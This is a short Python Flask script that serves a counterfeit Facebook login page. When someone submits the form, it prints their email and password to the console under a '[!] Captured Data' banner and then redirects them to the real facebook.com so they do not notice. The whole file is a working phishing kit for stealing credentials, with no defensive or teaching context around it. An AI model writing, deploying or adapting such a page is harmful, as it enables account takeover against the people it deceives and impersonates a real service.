from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title></head>
<body style="font-family: Arial; background-color: #f0f2f5; text-align: center; padding-top: 50px;">
    <h2 style="color: #1877f2;">facebook</h2>
    <form action="/login" method="post" style="background: white; padding: 20px; display: inline-block; border-radius: 8px;">
        <input type="text" name="email" placeholder="Email" required><br><br>
        <input type="password" name="password" placeholder="Password" required><br><br>
        <button type="submit" style="background: #1877f2; color: white; border: none; padding: 10px 20px;">Log In</button>
    </form>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    print(f"\n[!] Captured Data: \nEmail: {email} \nPassword: {password}\n")
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run()
